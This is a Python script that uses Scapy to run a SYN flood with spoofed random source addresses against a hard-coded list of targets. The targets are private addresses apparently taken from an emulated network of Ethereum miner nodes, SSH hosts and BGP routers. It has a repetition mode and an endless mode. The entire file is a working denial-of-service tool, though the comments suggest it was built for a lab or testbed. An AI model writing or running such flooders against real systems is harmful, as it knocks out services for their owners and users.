import random
import argparse
import logging
from datetime import datetime
from scapy.all import IP, TCP, send

# --- Logging setup ---
log_filename = f"syn_flood_{datetime.now().strftime('%Y%m%d_%H%M%S')}.log"
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s %(message)s",
    handlers=[
        logging.FileHandler(log_filename),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

def generate_random_ip():
    return ".".join(str(random.randint(0, 255)) for _ in range(4))

def generate_random_port():
    return random.randint(1024, 65535)

# Targets drawn from mini_emulator/docker-compose.yml.
# Ethereum miner hosts (*.0.71) expose geth: 8545 (HTTP RPC), 8546 (WebSocket),
# 30303 (P2P/discovery). Plain SEED hosts have sshd on 22. Border routers run
# BGP on 179. The IX route server (10.103.0.103) also speaks BGP.
targets_to_open_ports = {
    # AS160 - net_160_net0
    "10.160.0.71":  [8545, 8546, 30303, 22],  # hnode_160_host_0 (miner + bootnode)
    "10.160.0.72":  [22],                      # hnode_160_host_1
    "10.160.0.73":  [22],                      # hnode_160_host_2
    "10.160.0.254": [179],                     # brdnode_160_router0

    # AS161 - net_161_net0
    "10.161.0.71":  [8545, 8546, 30303, 22],  # hnode_161_host_0 (miner)
    "10.161.0.72":  [22],                      # hnode_161_host_1
    "10.161.0.73":  [22],                      # hnode_161_host_2
    "10.161.0.254": [179],                     # brdnode_161_router0

    # AS162 - net_162_net0
    "10.162.0.71":  [8545, 8546, 30303, 22],  # hnode_162_host_0 (miner)
    "10.162.0.72":  [22],                      # hnode_162_host_1
    "10.162.0.73":  [22],                      # hnode_162_host_2
    "10.162.0.74":  [22],                      # hnode_162_new_eth_node
    "10.162.0.254": [179],                     # brdnode_162_router0

    # IX103 - net_ix_ix103
    "10.103.0.103": [179],                     # rs_ix_ix103 (route server)
    "10.103.0.160": [179],                     # brdnode_160_router0 (ix side)
    "10.103.0.161": [179],                     # brdnode_161_router0 (ix side)
    "10.103.0.162": [179],                     # brdnode_162_router0 (ix side)
}

def run_round(num_packets):
    target_ip = random.choice(list(targets_to_open_ports.keys()))
    target_port = random.choice(targets_to_open_ports[target_ip])

    for _ in range(num_packets):
        src_ip = generate_random_ip()
        src_port = generate_random_port()
        seq_num = random.randint(0, 4294967295)
        window = random.randint(1024, 65535)

        packet = IP(dst=target_ip, src=src_ip) / \
                 TCP(sport=src_port,
                     dport=target_port,
                     flags="S",
                     seq=seq_num,
                     window=window,
                     options=[('MSS', 1460)])
        try:
            send(packet, verbose=False)
            logger.info(
                f"SENT | src={src_ip}:{src_port} -> dst={target_ip}:{target_port} "
                f"seq={seq_num} win={window}"
            )
        except Exception as e:
            logger.error(f"ERROR sending packet: {e}")

def parse_args():
    parser = argparse.ArgumentParser(description="SYN flood with randomized TCP parameters.")
    group = parser.add_mutually_exclusive_group()
    group.add_argument(
        "-r", "--reps",
        type=int,
        default=10,
        help="Number of repetitions (default: 10)"
    )
    group.add_argument(
        "-i", "--infinite",
        action="store_true",
        help="Run forever until Ctrl+C"
    )
    parser.add_argument(
        "-n", "--num-packets",
        type=int,
        default=2000,
        help="Number of packets per round (default: 2000)"
    )
    return parser.parse_args()

def main():
    args = parse_args()

    logger.info(f"Logging packets to: {log_filename}")
    logger.info("Starting SYN flood with randomized TCP parameters...")
    logger.info("Press Ctrl+C to stop.")

    if args.infinite:
        logger.info("Mode: infinite")
        round_num = 0
        while True:
            round_num += 1
            logger.info(f"--- Round {round_num} ---")
            run_round(args.num_packets)
    else:
        logger.info(f"Mode: {args.reps} repetitions")
        for rep in range(1, args.reps + 1):
            logger.info(f"--- Round {rep}/{args.reps} ---")
            run_round(args.num_packets)

    logger.info("Done.")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        logger.info("\nStopped by user.")